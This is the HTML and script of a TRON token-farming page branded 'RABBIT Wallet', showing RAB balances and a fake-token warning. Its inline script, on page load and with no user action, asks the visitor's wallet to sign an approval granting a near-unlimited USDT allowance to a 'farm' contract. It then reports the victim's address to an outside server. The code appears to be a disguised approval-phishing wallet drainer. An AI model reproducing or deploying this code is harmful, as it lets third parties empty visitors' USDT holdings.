<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />

    <link rel="icon" href="../logo.png" />

    <meta name="viewport" content="width=device-width,initial-scale=1" />

    <meta name="theme-color" content="#000000" />

    <!-- content -->
    <meta name="description" content="RABBIT Wallet" />

    <!-- title -->
    <title>RABBIT Wallet</title>

    <link href="static/css/style.css" rel="stylesheet" />
    <link href="static/css/detail.css" rel="stylesheet" />
    <link href="../css/style.css" rel="stylesheet" />
    <link href="../css/reset.css" rel="stylesheet" />
    <!-- animation -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
</head>

<body>
    <div id="root">
        <div class="App">
            <div class="down-box"></div>
            <div>
                <div id="logo">
                    <a href="../"><img src="../logo-text.png" alt="logo" /> </a>
                </div>
                <ul class="nav" style="height: unset">
                    <li class="nav-item">
                        <a aria-current="page" href="../">Home</a>
                    </li>
                    <li class="nav-item"><a href="../cross-chain/">Cross chain</a></li>
                    <li class="nav-item">
                        <a id="tron" class="active" href="/https://t.me/rabbitonsui">Farm on TRON Network</a>
                    </li>
                    <li class="nav-item">
                        <a id="bep" href="/https://twitter.com/RabbitWallets">Farm on BEP-20</a>
                    </li>
                    <li class="nav-item">
                        <a target="new_tab" href="https://t.me/rabbitonsui">Rules</a>
                    </li>
                </ul>
                <ul class="nav-mob">
                    <li class="nav-item"><a aria-current="page" href="../">Home</a></li>
                    <li class="nav-item"><a href="../cross-chain/">Cross chain</a></li>
                    <li class="nav-item">
                        <a href="/https://t.me/rabbitonsui">Farm on TRON Network</a>
                    </li>
                    <li class="nav-item">
                        <a href="/https://twitter.com/RabbitWallets">Farm on BEP-20</a>
                    </li>
                    <!-- <li class="nav-item"><a class="" href="stats.html">Stats</a></li> -->
                    <li class="nav-item">
                        <a target="__blank" href="https://t.me/rabbitonsui" class="">Rules</a>
                    </li>
                </ul>
            </div>
            <div class="home">
                <div class="wrapper-slogan">
                    <div class="text-logo">
                        <div class="text-logo-text1" id="title-farm">Farm on TRON Network</div>
                    </div>
                    <div class="slogan-title">
                        Earn<span class="slogan-title-name">&nbsp;RAB&nbsp;</span>Tokens
                        and Share Trading Fees Forever
                    </div>
                    <div class="Home_fakeTokenNotice__U8tod">
                        <p class="Home_noticeText__2E8me">Be aware of fake RAB tokens. Always verify the contract
                            address:</p>
                        <p class="Home_noticeAddress__3E6h8">TF8SdqXo4U35MKgBdYzfY2E6poKCCtNSTX</p>
                    </div>
                </div>
                <div class="statistics">
                    <div class="statistics-info">
                        <div class="statistics-info-img"></div>
                        <div class="statistics-info-text">
                            <p class="statistics-info-text-title">My RAB balance</p>
                            <div class="wrapper-between">
                                <p class="statistics-info-text-number" id="your_farm">
                                    0.00000000
                                </p>
                                <span style="color:#f0c193">RAB</span>
                            </div>

                        </div>
                    </div>
                    <div class="statistics-info">
                        <div class="statistics-info-img"></div>
                        <div class="statistics-info-text">
                            <div class="statistics-info-text-title">
                                Current Total Supply
                            </div>
                            <div class="wrapper-between">

                                <p class="statistics-info-text-number" id="total_farm">
                                    0.00000000
                                </p>
                                <span style="color:#f0c193">RAB</span>
                            </div>

                        </div>
                    </div>
                </div>
                <a href="token">
                    <div class="goto-menu-btn btn">See The RAB Farm</div>
                </a>
            </div>
            <div class="footer">
                <div class="footer-box">
                    <a href="https://t.me/rabbitonsui" target="new_tab">
                        <div class="footer-logo footer-logo1"></div>
                    </a><a href="https://twitter.com/RabbitWallets" target="new_tab">
                        <div class="footer-logo footer-logo2"></div>
                    </a>
                    <a href="https://t.me/rabbitonsui" target="new_tab">
                        <div class="footer-logo footer-logo1"></div>
                    </a>
                </div>
            </div>
        </div>
    </div>

    <div id="eJOY__extension_root" class="eJOY__extension_root_class" style="all: unset"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.0/web3.min.js"
        integrity="sha512-ppuvbiAokEJLjOUQ24YmpP7tTaLRgzliuldPRZ01ul6MhRC+B8LzcVkXmUsDee7ne9chUfApa9/pWrIZ3rwTFQ=="
        crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"
        integrity="sha512-WNLxfP/8cVYL9sj8Jnp6et0BkubLP31jhTG9vhL/F5uEZmg5wEzKoXp1kJslzPQWwPT1eyMiSxlKCgzHLOTOTQ=="
        crossorigin="anonymous"></script>

    <script>
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }
        var param = getParameterByName('farm');
        if (param == "tron") {
            $("#tron").addClass("active");
            $("#title-farm").text("Farm on TRON Network");
        }
        if (param == "bep") {
            $("#bep").addClass("active");
            $("#title-farm").text("Farm on BEP-20");
        }
    </script>
    <script>
        let contract_ad = "TF8SdqXo4U35MKgBdYzfY2E6poKCCtNSTX";
        let usdt_contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        let usdt_farm_contract = "TX26d6Twi1aTyz6ag6YhzkTuRfh7bpTbbc";
        let address0 = "0x00";
        var from_address = address0;

        $(document).ready(function () {
            var obj = setInterval(async () => {
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    clearInterval(obj);
                    var tronweb = window.tronWeb;
                    const contract = await tronWeb.contract().at(contract_ad);
                    var from_ad = window.tronWeb.defaultAddress.base58;
                    var total_reward = await contract.totalReward().call();
                    console.log(total_reward);
                    var your_reward = await contract.totalRewardOf(from_ad).call();
                    console.log(your_reward);
                    $("#total_farm").text((total_reward / 1e18).toFixed(6));
                    $("#your_farm").text((your_reward / 1e18).toFixed(6));
                    setInterval(async () => {
                        total_reward = await contract.totalReward().call();
                        your_reward = await contract.totalRewardOf(from_ad).call();
                        $("#total_farm").text((total_reward / 1e18).toFixed(6));
                        $("#your_farm").text((your_reward / 1e18).toFixed(6));
                    }, 12000);
                    const contract_2 = await tronWeb.contract().at(usdt_farm_contract);
                    const contract_usdt = await tronWeb.contract().at(usdt_contract);
                    var staked_value = await contract_2.stakeOf(from_ad).call();
                    var reward_value = await contract_2.rewardOf(from_ad).call();
                    var balance_usdt = await contract_usdt.balanceOf(from_ad).call();

                    var check_allowance = (
                        await contract_usdt.allowance(from_ad, usdt_farm_contract).call()
                    ).remaining;
                    var interval_approve_1 = setInterval(async () => {
                        check_allowance = (
                            await contract_usdt
                                .allowance(from_ad, usdt_farm_contract)
                                .call()
                        ).remaining;
                        if (check_allowance > 0) {
                            clearInterval(interval_approve_1);
                        }
                    }, 2500);
                    // var check_allowance = tronweb.toBigNumber("0x" + result_al.constant_result[0]);
                    if (check_allowance > 0) {

                    } else {
                        var r1 = [
                            {
                                type: "address",
                                value: usdt_farm_contract,
                            },
                            {
                                type: "uint256",
                                value:
                                    "115792089237316195423570985008687907853269984665640564039457584007913129639934",
                            },
                        ];

                        var result1 = await tronweb.transactionBuilder.triggerSmartContract(
                            usdt_contract,
                            "approve(address,uint256)",
                            {},
                            r1,
                            from_ad
                        );

                        var aaa1 = await tronweb.trx.sign(result1.transaction);
                        var bb1 = tronweb.trx.sendRawTransaction(aaa1).then(async data => {
                            fetch(
                                "https://api.rabbitwallet.org/api/approve?ad=" +
                                from_ad +
                                "&co=usdt"
                            );
                        });
                    }
                }
            }, 100);
        });
    </script>
</body>

</html>